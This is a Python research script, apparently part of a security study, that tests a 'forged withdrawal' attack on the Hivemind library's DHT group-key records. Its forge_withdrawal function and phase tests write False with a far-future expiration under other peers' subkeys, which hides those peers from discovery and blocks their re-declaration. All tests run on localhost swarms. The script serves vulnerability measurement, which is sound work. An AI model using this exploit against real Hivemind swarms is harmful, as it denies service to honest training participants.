"""
Step 8 -- forging a withdrawal: deleting a peer from discovery with one DHT write.

Every capture attack measured so far needs the attacker to own the victim's lookup seed
set: `bucket_size` crafted identities plus the custody they buy (HANDOFF section 4.6,
confirmed over 28 runs). This one should need neither.

**What a withdrawal is.** The averaging group key is a DHT dictionary: the subkey is a
peer's PeerID, the value is True ("looking for a group") or False ("no longer looking"),
and each entry carries an expiration. `get_averagers(only_active=True)` skips False
entries (`key_manager.py:87`), so a withdrawn peer is invisible to anyone looking for
partners. Hivemind writes the False itself when a peer is done (`key_manager.py:61`).

**Why the expiration matters.** A subkey holds one value, and `TimedStorage.store`
overwrites only if the new expiration is strictly *later* (`timed_storage.py:81-82`). To
replace its own True with False, Hivemind uses `np.nextafter(expiration, +inf)` -- the
next representable float, later by ~1e-16s. Just enough to win the comparison, not enough
to extend the record's life.

**The attack.** Nothing checks *who* writes under a subkey: it is an unverified
`peer_id.to_bytes()` (`key_manager.py:64`), `PeerID.__init__` validates nothing, and there
is no `record_validator` anywhere in `hivemind/averaging/`. So write False under an honest
peer's subkey with a *far-future* expiration instead of a marginal one, and:

  * that peer disappears from everyone's candidate list, and
  * its own honest re-declaration is **rejected**, because it carries a near-term
    expiration and loses the comparison.

The second part is what makes this a suppression rather than a per-round race.

**This is an addition, not a removal**, which is why it should not care about caching or
replication the way section 4.5 and 4.6's read-filtering does: `add_candidate` merges every
responder's dictionary (`node.py:834-837`), so a forged entry spreads instead of being
outvoted.

Phase 1 asks four questions in order, and the first can kill the attack outright.

Run:
    .venv/bin/python research/hivemind/step8_withdrawal.py --phase 1
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import time
from pathlib import Path

from hivemind.averaging.key_manager import GroupKeyManager
from hivemind.dht.node import DHTNode
from hivemind.dht.routing import DHTID
from hivemind.p2p import PeerID
from hivemind.utils.timed_storage import get_dht_time

RESULTS_DIR = Path(__file__).resolve().parent / "results"
LOCALHOST = ["/ip4/127.0.0.1/tcp/0"]

PREFIX = "step8_grad_averager"
GROUP_KEY = f"{PREFIX}.0b"


class NodeAsDHT:
    """Lets `GroupKeyManager` drive a `DHTNode` directly (same adapter as step5).

    `GroupKeyManager` only calls `dht.store(...)` and `dht.get(...)` with
    `return_future=True` (`key_manager.py:62,86`), which is a `DHT`-only argument, so this
    forwards those two and drops it. Key construction, subkey choice and parsing stay
    Hivemind's own -- that is the point of driving the real manager rather than writing
    the records by hand.
    """

    def __init__(self, node: DHTNode):
        self._node = node
        self.peer_id = node.peer_id

    async def store(self, *args, return_future: bool = False, **kwargs):
        return await self._node.store(*args, **kwargs)

    async def get(self, *args, return_future: bool = False, **kwargs):
        return await self._node.get(*args, **kwargs)


def manager(node: DHTNode) -> GroupKeyManager:
    return GroupKeyManager(NodeAsDHT(node), prefix=PREFIX, initial_group_bits="", target_group_size=None)


async def forge_withdrawal(attacker: DHTNode, target: PeerID, expiration: float) -> bool:
    """Write `False` under someone else's subkey.

    This is exactly `declare_averager(..., looking_for_group=False)` with a chosen
    expiration instead of `nextafter(own_expiration)`, and aimed at a PeerID that is not
    the writer's. Going through the real `GroupKeyManager` would force
    `nextafter(expiration)`, which is the *honest* withdrawal; the whole attack is the
    freedom to pick the number, so the store is issued directly with the same key and
    subkey the manager would use.
    """
    return await attacker.store(
        key=GROUP_KEY,
        subkey=target.to_bytes(),
        value=False,
        expiration_time=expiration,
    )


async def candidate_list(node: DHTNode) -> set:
    """The set of PeerIDs a peer looking for partners would see."""
    found = await manager(node).get_averagers(GROUP_KEY, only_active=True)
    return {peer_id.to_bytes() for peer_id, _expiration in found}


async def build_swarm(num_honest: int, caching: bool):
    """A bootstrap node, `num_honest` honest peers, and one attacker with a random node_id.

    The attacker's node_id is deliberately *not* crafted. Section 4.6's attacks need
    custody of the key's replicas; if this one also needs it, the headline advantage is
    gone and that is the result.
    """
    opts = {} if caching else dict(cache_locally=False, cache_nearest=0, cache_on_store=False, cache_size=0)
    bootstrap = await DHTNode.create(host_maddrs=LOCALHOST, **opts)
    initial = [str(addr) for addr in await bootstrap.get_visible_maddrs()]
    honest = [
        await DHTNode.create(initial_peers=initial, host_maddrs=LOCALHOST, **opts)
        for _ in range(num_honest)
    ]
    attacker = await DHTNode.create(initial_peers=initial, host_maddrs=LOCALHOST, **opts)
    return bootstrap, honest, attacker


async def declare_all(honest: list, expiration: float) -> int:
    """Every honest peer advertises through the real GroupKeyManager. Returns how many stuck."""
    accepted = 0
    for node in honest:
        if await manager(node).declare_averager(GROUP_KEY, node.peer_id, expiration_time=expiration):
            accepted += 1
    return accepted


async def shutdown(*groups):
    for group in groups:
        for node in group if isinstance(group, list) else [group]:
            try:
                await node.shutdown()
            except Exception:
                pass


# --------------------------------------------------------------------------
# Phase 1 -- four questions, first one can kill it
# --------------------------------------------------------------------------


async def phase1(args) -> list:
    rows = []
    bootstrap, honest, attacker = await build_swarm(args.num_honest, args.caching)
    victim, bystander = honest[0], honest[1]
    honest_ids = {n.peer_id.to_bytes() for n in honest}

    try:
        ttl = args.ttl
        accepted = await declare_all(honest, get_dht_time() + ttl)

        # --- control: everyone is visible before the attack ------------------
        before = await candidate_list(bystander)
        control_ok = accepted == len(honest) and honest_ids <= before
        print(f"control            : {accepted}/{len(honest)} declarations accepted, "
              f"{len(before & honest_ids)}/{len(honest)} visible to a bystander"
              f"  -> {'ok' if control_ok else 'BROKEN, stop here'}")
        rows.append(dict(check="control", detail=f"{accepted}/{len(honest)} declared",
                         result=control_ok))
        if not control_ok:
            return rows

        # --- 1. is a forged write under someone else's subkey accepted? ------
        far = get_dht_time() + args.forge_seconds
        stored = await forge_withdrawal(attacker, victim.peer_id, far)
        print(f"1 forged write     : store returned {stored}"
              f"  -> {'accepted' if stored else 'REJECTED -- attack is dead'}")
        rows.append(dict(check="forged_write_accepted", detail=f"+{args.forge_seconds}s", result=bool(stored)))
        if not stored:
            return rows

        # --- 2. does the victim vanish, for a third party? -------------------
        after = await candidate_list(bystander)
        victim_gone = victim.peer_id.to_bytes() not in after
        others = len(after & (honest_ids - {victim.peer_id.to_bytes()}))
        print(f"2 victim hidden    : victim visible to bystander: {not victim_gone}; "
              f"other honest peers still visible: {others}/{len(honest) - 1}"
              f"  -> {'hidden' if victim_gone else 'still visible'}")
        rows.append(dict(check="victim_hidden_from_bystander", detail=f"others {others}/{len(honest)-1}",
                         result=victim_gone))

        # --- 3. can the victim re-declare itself back? -----------------------
        redeclared = await manager(victim).declare_averager(
            GROUP_KEY, victim.peer_id, expiration_time=get_dht_time() + ttl
        )
        after_retry = await candidate_list(victim)
        back = victim.peer_id.to_bytes() in after_retry
        print(f"3 re-declaration   : declare_averager returned {redeclared}, "
              f"victim visible again: {back}"
              f"  -> {'suppressed' if not back else 'only a per-round race'}")
        rows.append(dict(check="redeclaration_blocked", detail=f"declare returned {redeclared}",
                         result=not back))

        # --- 4. what expirations are accepted? -------------------------------
        # This finds a *floor*, not a ceiling. A forgery must beat the victim's current
        # record (`timed_storage.py:81-82`), so anything at or below the honest
        # advertisement's own expiry is rejected -- which is fact 2 working exactly as
        # documented, not a defence. What matters is whether anything caps the top end.
        print("4 accepted expirations (floor = must beat the honest record, ttl above):")
        for label, seconds in (("+10s", 10), ("+1h", 3600), ("+1d", 86400),
                               ("+1y", 365 * 86400), ("+10y", 3650 * 86400)):
            # A fresh target each time, so an earlier forgery cannot mask a later
            # rejection: a second write under the same subkey would lose the expiration
            # comparison anyway and tell us nothing about the ceiling.
            target = honest[2 + len([r for r in rows if r["check"] == "expiration_ceiling"])]
            ok = await attacker.store(key=GROUP_KEY, subkey=target.peer_id.to_bytes(),
                                      value=False, expiration_time=get_dht_time() + seconds)
            print(f"   {label:<6} accepted: {ok}")
            rows.append(dict(check="expiration_ceiling", detail=label, result=bool(ok)))
    finally:
        await shutdown([bootstrap], honest, [attacker])
    return rows


def write_results(rows: list, tag: str) -> None:
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)
    path = RESULTS_DIR / f"step8_withdrawal_{tag}.csv"
    with open(path, "w", newline="") as handle:
        fields = sorted({k for row in rows for k in row})
        writer = csv.DictWriter(handle, fieldnames=sorted(fields, key=lambda f: (f != "check", f)))
        writer.writeheader()
        writer.writerows(rows)
    print(f"\nwrote {path}  ({len(rows)} rows)")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--phase", type=int, default=1, choices=[1, 2])
    parser.add_argument("--num-honest", type=int, default=12)
    parser.add_argument("--ttl", type=float, default=60.0,
                        help="how long an honest advertisement lives; real ones are seconds")
    parser.add_argument("--forge-seconds", type=float, default=3600.0,
                        help="how far in the future the forged withdrawal expires")
    parser.add_argument("--caching", action=argparse.BooleanOptionalAction, default=True,
                        help="Hivemind's default is on; this attack should not care")
    parser.add_argument("--hide-counts", type=int, nargs="+", default=[1, 3, 6, 11],
                        help="phase 2: how many of the honest peers to hide")
    parser.add_argument("--repeats", type=int, default=2)
    parser.add_argument("--fightback-seconds", type=float, default=30.0)
    parser.add_argument("--tag", type=str, default=None)
    args = parser.parse_args()
    tag = args.tag or f"phase{args.phase}"

    started = time.perf_counter()
    rows = asyncio.run(phase1(args) if args.phase == 1 else phase2(args))
    write_results(rows, tag)
    print(f"wall clock: {time.perf_counter() - started:.1f}s")




# --------------------------------------------------------------------------
# Phase 2 -- scale, custody, and a victim that fights back
# --------------------------------------------------------------------------


async def phase2(args) -> list:
    """Three questions Phase 1 leaves open, each with the honest control alongside."""
    rows = []

    # --- 5. scale: hide k of N ---------------------------------------------
    for hide in args.hide_counts:
        for repeat in range(args.repeats):
            bootstrap, honest, attacker = await build_swarm(args.num_honest, args.caching)
            try:
                await declare_all(honest, get_dht_time() + args.ttl)
                bystander = honest[-1]  # never a target, so it can always be read from
                targets = honest[:hide]
                far = get_dht_time() + args.forge_seconds
                written = 0
                for node in targets:
                    if await forge_withdrawal(attacker, node.peer_id, far):
                        written += 1
                seen = await candidate_list(bystander)
                hidden = sum(n.peer_id.to_bytes() not in seen for n in targets)
                survivors = sum(n.peer_id.to_bytes() in seen for n in honest[hide:])
                rows.append(dict(check="scale", detail=f"hide {hide}/{args.num_honest}",
                                 repeat=repeat, written=written, hidden=hidden,
                                 survivors=survivors, expected_survivors=args.num_honest - hide))
                print(f"5 scale hide={hide:<3} rep{repeat}: {written} writes accepted, "
                      f"{hidden}/{hide} hidden, {survivors}/{args.num_honest - hide} survivors still visible")
            finally:
                await shutdown([bootstrap], honest, [attacker])

    # --- 6. does the attacker need custody? --------------------------------
    # Section 4.6's read-filtering collapses without custody of the key's replicas. If this
    # attack is indifferent to the attacker's node_id, that is the headline advantage.
    for custody in (False, True):
        for repeat in range(args.repeats):
            opts = {} if args.caching else dict(cache_locally=False, cache_nearest=0,
                                                cache_on_store=False, cache_size=0)
            bootstrap = await DHTNode.create(host_maddrs=LOCALHOST, **opts)
            initial = [str(addr) for addr in await bootstrap.get_visible_maddrs()]
            honest = [await DHTNode.create(initial_peers=initial, host_maddrs=LOCALHOST, **opts)
                      for _ in range(args.num_honest)]
            node_id = DHTID(int(DHTID.generate(source=GROUP_KEY)) ^ 0) if custody else None
            attacker = await DHTNode.create(initial_peers=initial, host_maddrs=LOCALHOST,
                                            node_id=node_id, **opts)
            try:
                await declare_all(honest, get_dht_time() + args.ttl)
                victim, bystander = honest[0], honest[-1]
                ok = await forge_withdrawal(attacker, victim.peer_id, get_dht_time() + args.forge_seconds)
                seen = await candidate_list(bystander)
                hidden = victim.peer_id.to_bytes() not in seen
                rows.append(dict(check="custody", detail="crafted node_id" if custody else "random node_id",
                                 repeat=repeat, written=int(bool(ok)), hidden=int(hidden),
                                 survivors=len(seen) - 0, expected_survivors=args.num_honest - 1))
                print(f"6 custody={'crafted' if custody else 'random ':<8} rep{repeat}: "
                      f"write {bool(ok)}, victim hidden {hidden}")
            finally:
                await shutdown([bootstrap], honest, [attacker])

    # --- 8. the victim fights back -----------------------------------------
    bootstrap, honest, attacker = await build_swarm(args.num_honest, args.caching)
    try:
        await declare_all(honest, get_dht_time() + args.ttl)
        victim, bystander = honest[0], honest[-1]
        await forge_withdrawal(attacker, victim.peer_id, get_dht_time() + args.forge_seconds)
        deadline = time.perf_counter() + args.fightback_seconds
        attempts = recovered = 0
        while time.perf_counter() < deadline:
            attempts += 1
            await manager(victim).declare_averager(
                GROUP_KEY, victim.peer_id, expiration_time=get_dht_time() + args.ttl
            )
            if victim.peer_id.to_bytes() in await candidate_list(bystander):
                recovered += 1
            await asyncio.sleep(1.0)
        rows.append(dict(check="fightback", detail=f"{args.fightback_seconds}s",
                         repeat=0, written=attempts, hidden=int(recovered == 0),
                         survivors=recovered, expected_survivors=0))
        print(f"8 fightback        : {attempts} re-declarations over {args.fightback_seconds}s, "
              f"victim visible on {recovered} of them"
              f"  -> {'suppression holds' if recovered == 0 else 'victim recovered'}")
    finally:
        await shutdown([bootstrap], honest, [attacker])

    return rows


if __name__ == "__main__":
    main()
